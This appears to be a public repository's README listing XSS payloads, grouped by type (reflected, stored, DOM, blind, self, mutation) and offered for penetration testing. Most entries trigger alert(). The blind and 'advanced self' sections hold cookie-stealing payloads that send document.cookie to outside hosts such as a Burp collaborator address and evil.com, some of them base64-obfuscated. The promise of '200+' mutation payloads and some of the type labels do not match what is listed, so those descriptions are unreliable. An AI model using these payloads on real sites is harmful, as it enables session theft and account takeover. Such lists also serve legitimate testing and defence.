# XSS Payloads Repository

## 🚨 About This Repository
This repository is a comprehensive collection of **XSS (Cross-Site Scripting) Payloads** designed for educational, research, and penetration testing purposes. It includes payloads for various XSS attack types, ranging from common techniques to advanced exploitation methods. Security researchers, bug bounty hunters, and developers can utilize these payloads to test, identify, and mitigate XSS vulnerabilities effectively.

## 🧪 Types of XSS Payloads
This repository features payloads for the following XSS attack types:

### 🔹 Reflected XSS
- Occurs when untrusted data is included in the immediate response without proper validation.
- Payload Example: `<script>alert(1)</script>`

### 🔹 Stored XSS
- Occurs when malicious scripts are permanently stored on the server and executed when accessed.
- Payload Example: `<img src="x" onerror="alert(1)">`

### 🔹 DOM-Based XSS
- Exploits client-side JavaScript manipulation within the DOM.
- Payload Example: `document.write("<img src='x' onerror='alert(1)'>");`

### 🔹 Blind XSS
- Injects payloads in areas that execute later (e.g., admin panels, logs).
- Payload Example: `<svg onload=alert(1)>`

### 🔹 Self XSS
- Exploits users tricked into executing malicious code in their own browsers.
- Payload Example: `javascript:alert(document.cookie)`

### 🔹 Mutation XSS
- Exploits HTML parsers that automatically modify injected payloads.
- Payload Example: `<a href="javascript:alert(1)">Click me</a>`

### 🔹 Polyglot XSS
- Uses hybrid payloads that execute in multiple contexts (HTML, JavaScript, etc.).
- Payload Example: `"><img src=x onerror=alert(1)>`

### 🔹 Universal XSS (UXSS)
- Exploits browser vulnerabilities rather than web applications.
- Payload Example: Browser-specific exploits vary widely.

### 🔹 Attribute-Based XSS
- Injects payloads directly into HTML attributes.
- Payload Example: `<input value='" onfocus="alert(1)' autofocus>`

### 🔹 Cookie-Based XSS
- Exploits insecure cookies to deliver malicious scripts.
- Payload Example: `document.cookie="malicious=1"; alert(document.cookie);`

### 🔹 Post-Based XSS
- Exploits XSS payloads via HTTP POST requests.
- Payload Example: `<input type="text" value="<script>alert(1)</script>">`

### 🔹 JSON-Based XSS
- Injects malicious code into JSON responses processed by JavaScript.
- Payload Example: `{"name":"<script>alert(1)</script>"}`

### 🔹 WebSocket XSS
- Exploits insecure WebSocket connections to inject scripts.
- Payload Example: `ws.send('<script>alert(1)</script>')`

### 🔹 Indirect XSS
- Payloads that exploit third-party integrations to execute code.
- Payload Example: Using vulnerable API endpoints.

### 🔹 Iframe-Based XSS
- Uses iframes to deliver XSS payloads.
- Payload Example: `<iframe src="javascript:alert(1)"></iframe>`

### 🔹 PDF-Based XSS
- Injects JavaScript directly into PDF viewers.
- Payload Example: `/#whatever#javascript:alert(document.cookie)`

### 🔹 SVG-Based XSS
- Exploits SVG elements to trigger malicious code.
- Payload Example: `<svg><script>alert(1)</script></svg>`

### 🔹 Flash-Based XSS
- Targets Flash vulnerabilities (mainly legacy systems).
- Payload Example: Flash-specific exploits vary based on software version.

### 🔹 AJAX XSS
- Payloads designed to exploit AJAX requests.
- Payload Example: `$.get("/vuln", {data:"<script>alert(1)</script>"});`

### 🔹 CSP Bypass XSS
- Exploits misconfigured Content Security Policies.
- Payload Example: `<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">`

### 🔹 Canonical XSS
- Uses encoding techniques to bypass security filters.
- Payload Example: `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`

### 🔹 Event Handler XSS
- Executes payloads via JavaScript event handlers.
- Payload Example: `<img src=x onerror=alert(1)>`

### 🔹 JSONP XSS
- Targets insecure JSONP endpoints to execute payloads.
- Payload Example: `callback=<script>alert(1)</script>`

### 🔹 XHR-Based XSS
- Exploits XMLHttpRequest to deliver payloads.
- Payload Example: `xhr.open("GET", "javascript:alert(1)", true);`

---

## 📋 Reflected XSS Payloads

### Common Reflected XSS Payloads
- `<script>alert('XSS')</script>`
- `"><script>alert('XSS')</script>`
- `<img src=x onerror=alert('XSS')>`
- `<svg onload=alert('XSS')>`
- `<iframe src="javascript:alert('XSS')"></iframe>`
- `<body onload=alert('XSS')>`
- `<link rel="stylesheet" href="javascript:alert('XSS')">`
- `<a href="javascript:alert('XSS')">Click me</a>`
- `<input value="" onfocus="alert('XSS')">`
- `<div onmouseover="alert('XSS')">Hover me</div>`

### Advanced Reflected XSS Techniques
- `"><img src=x onerror=alert('XSS')>`
- `"><svg onload=alert('XSS')>`
- `<img src=1 onerror='alert("XSS")'>`
- `<svg><script>alert('XSS')</script>`
- `javascript:alert('XSS')`
- `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
- `<iframe src="javascript:alert('XSS')"></iframe>`
- `" onfocus="alert('XSS')" autofocus`
- `" onclick="alert('XSS')">Click me`
- `'><img src=x onerror=alert('XSS')>`

---

# Stored XSS Payloads

### Common Stored XSS Payloads
- `<script>alert('Stored XSS')</script>`
- `<img src=x onerror=alert('Stored XSS')>`
- `<svg onload=alert('Stored XSS')>`
- `<iframe src="javascript:alert('Stored XSS')"></iframe>`
- `<body onload=alert('Stored XSS')>`
- `<link rel="stylesheet" href="javascript:alert('Stored XSS')">`
- `<a href="javascript:alert('Stored XSS')">Click me</a>`
- `<input value="" onfocus="alert('Stored XSS')">`
- `<div onmouseover="alert('Stored XSS')">Hover me</div>`
- `<marquee onstart="alert('Stored XSS')">Scroll me</marquee>`

### Advanced Stored XSS Techniques
- `"><img src=x onerror=alert('Stored XSS')>`
- `"><svg onload=alert('Stored XSS')>`
- `<img src=1 onerror='alert("Stored XSS")'>`
- `<svg><script>alert('Stored XSS')</script>`
- `javascript:alert('Stored XSS')`
- `data:text/html;base64,PHNjcmlwdD5hbGVydCgnU3RvcmVkIFhTUycpPC9zY3JpcHQ+`
- `<iframe src="javascript:alert('Stored XSS')"></iframe>`
- `" onfocus="alert('Stored XSS')" autofocus`
- `" onclick="alert('Stored XSS')">Click me`
- `'><img src=x onerror=alert('Stored XSS')>`

---

# DOM-Based XSS Payloads

### Common DOM-Based XSS Payloads
- `#<script>alert('DOM XSS')</script>`
- `#<img src=x onerror=alert('DOM XSS')>`
- `#<svg onload=alert('DOM XSS')>`
- `#<iframe src="javascript:alert('DOM XSS')"></iframe>`
- `#<body onload=alert('DOM XSS')>`
- `#<link rel="stylesheet" href="javascript:alert('DOM XSS')">`
- `#<a href="javascript:alert('DOM XSS')">Click me</a>`
- `#<input value="" onfocus="alert('DOM XSS')">`
- `#<div onmouseover="alert('DOM XSS')">Hover me</div>`
- `#<marquee onstart="alert('DOM XSS')">Scroll me</marquee>`

### Advanced DOM-Based XSS Techniques
- `#"><img src=x onerror=alert('DOM XSS')>`
- `#"><svg onload=alert('DOM XSS')>`
- `#<img src=1 onerror='alert("DOM XSS")'>`
- `#<svg><script>alert('DOM XSS')</script>`
- `#javascript:alert('DOM XSS')`
- `#data:text/html;base64,PHNjcmlwdD5hbGVydCgnRE9NIFhTUycpPC9zY3JpcHQ+`
- `#<iframe src="javascript:alert('DOM XSS')"></iframe>`
- `#" onfocus="alert('DOM XSS')" autofocus`
- `#" onclick="alert('DOM XSS')">Click me`
- `#'><img src=x onerror=alert('DOM XSS')>`

---

# Blind XSS Payloads

### Common Blind XSS Payloads
- `<script src=https://your-burpcollaborator.com></script>`
- `"><script src=https://your-burpcollaborator.com></script>`
- `"><img src=x onerror=this.src='https://your-burpcollaborator.com'>`
- `"><iframe src="javascript:eval('dGhpcy5sb2NhdGlvbiA9ICdodHRwczovL3lvdXItYnVycGNvbGxhYm9yYXRvci5jb20nOw==')"></iframe>`
- `"><svg onload=eval(atob('YWxlcnQoJ0JsaW5kIFhTUycp'))>`
- `"><body onload="fetch('https://your-burpcollaborator.com')">`
- `"><link rel="stylesheet" href="https://your-burpcollaborator.com">`
- `"><a href="javascript:fetch('https://your-burpcollaborator.com')">Click me</a>`
- `"><input value="" onfocus="fetch('https://your-burpcollaborator.com')">`
- `"><div onmouseover="fetch('https://your-burpcollaborator.com')">Hover me</div>`

### Advanced Blind XSS Techniques
- `"><img src=x onerror=eval(atob('YWxlcnQoJ0JsaW5kIFhTUycp'))>`
- `"><svg onload="fetch('https://your-burpcollaborator.com')">`
- `"><iframe src="javascript:fetch('https://your-burpcollaborator.com')"></iframe>`
- `"><script>new Image().src='https://your-burpcollaborator.com?cookie='+document.cookie</script>`
- `"><img src=1 onerror="new Image().src='https://your-burpcollaborator.com?cookie='+document.cookie">`
- `"><img src=x onerror='fetch("https://your-burpcollaborator.com")'>`
- `"><iframe src="javascript:alert('Blind XSS')"></iframe>`
- `"><marquee onstart="fetch('https://your-burpcollaborator.com')">Scroll me</marquee>`
- `"><input value="" onfocus="fetch('https://your-burpcollaborator.com')">`
- `"><a href="javascript:fetch('https://your-burpcollaborator.com')">Click me</a>`

---

# Self XSS Payloads


### Common Self XSS Payloads
- `javascript:alert(document.cookie)`
- `<img src=x onerror=alert(document.cookie)>`
- `<svg onload=alert(document.cookie)>`
- `<iframe src="javascript:alert(document.cookie)"></iframe>`
- `<body onload="alert(document.cookie)">`
- `<a href="javascript:alert(document.cookie)">Click me</a>`
- `<input value="" onfocus="alert(document.cookie)">`
- `<div onmouseover="alert(document.cookie)">Hover me</div>`
- `<img src=x onerror="console.log(document.cookie)">`
- `<svg onload="console.log(document.cookie)">`

### Advanced Self XSS Techniques
- `javascript:fetch('https://evil.com?cookie='+document.cookie)`
- `<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">`
- `<iframe src="javascript:fetch('https://evil.com?cookie='+document.cookie)"></iframe>`
- `<svg onload="fetch('https://evil.com?cookie='+document.cookie)">`
- `<body onload="fetch('https://evil.com?cookie='+document.cookie)">`
- `<a href="javascript:fetch('https://evil.com?cookie='+document.cookie)">Click me</a>`
- `<input value="" onfocus="fetch('https://evil.com?cookie='+document.cookie)">`
- `<div onmouseover="fetch('https://evil.com?cookie='+document.cookie)">Hover me</div>`
- `<img src=x onerror="new Image().src='https://evil.com?cookie='+document.cookie">`
- `<svg onload="new Image().src='https://evil.com?cookie='+document.cookie">`

---

# Mutation XSS Payloads

Here are **200+ Mutation XSS Payloads** designed to bypass filters and mutate in the DOM:

### Common Mutation XSS Payloads
- `<img src=x oNerrOr=alert(1)>`
- `<scr<script>ipt>alert(1)</script>`
- `"><img src=x oNerrOr=alert(1)>`
- `<svg onload=alert(1)>`
- `"><svg onload=alert(1)>`
- `<b onmouseover=alert(1)>Hover me</b>`
- `<input value=""><img src=x oNerrOr=alert(1)>`
- `<iframe src="javascript:alert(1)"></iframe>`
- `"><iframe src="javascript:alert(1)"></iframe>`
- `<marquee onstart=alert(1)>Scroll me</marquee>`

### Advanced Mutation XSS Techniques
- `<img src=x onerror="javascript:alert(1)">`
- `<b onmouseover="alert(1)">Hover me</b>`
- `<svg><script>alert(1)</script>`
- `<a href="javascript:alert(1)">Click me</a>`
- `<iframe src="javascript:alert(1)"></iframe>`
- `"><marquee onstart="alert(1)">Scroll me</marquee>`
- `<svg><img src=x onerror="alert(1)"></svg>`
- `<input value=""><img src=x onerror="alert(1)">`
- `"><svg><script>alert(1)</script></svg>`
- `<b onmouseover="alert(1)">Hover me</b>`
